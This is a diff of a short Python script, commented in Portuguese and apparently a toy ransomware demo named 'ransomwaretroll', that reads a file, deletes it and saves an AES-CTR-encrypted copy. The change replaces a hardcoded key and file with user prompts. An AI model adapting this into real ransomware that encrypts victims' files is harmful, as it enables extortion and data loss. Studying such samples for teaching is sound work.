@@ -1,24 +1,33 @@
 import os
 import pyaes
+import getpass
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# inserir o caminho do arquivo a ser criptografado
+path = input('Digite o caminho do arquivo: ')
 
-## remover o arquivo
-os.remove(file_name)
+# ler o arquivo a ser criptografado
+with open(path, "rb") as f:
+    file_data = f.read()
 
-## chave de criptografia
-key = b"testeransomwares"
+# inserir a chave de criptografia
+key = getpass.getpass('\nInsira a CHAVE de criptografia!\n\nCertifique-se que a CHAVE tenha 16, 24 ou 32 caracteres de comprimento: ').encode('utf-8')
+
+# loop para verificar o comprimento da chave
+while True:
+    if len(key) not in [16, 24, 32]:
+        key = getpass.getpass('\nCHAVE inválida!\n\nCertifique-se que a CHAVE tenha 16, 24 ou 32 caracteres de comprimento! ').encode('utf-8')
+    else:
+        break
+
+# remover o arquivo
+os.remove(path)
+
+# criptografar o arquivo
 aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# salvar o arquivo criptografado
+with open(path + ".ransomwaretroll", "wb") as encrypted_f:
+    encrypted_f.write(crypto_data)
+
+print('\nArquivo criptografado')
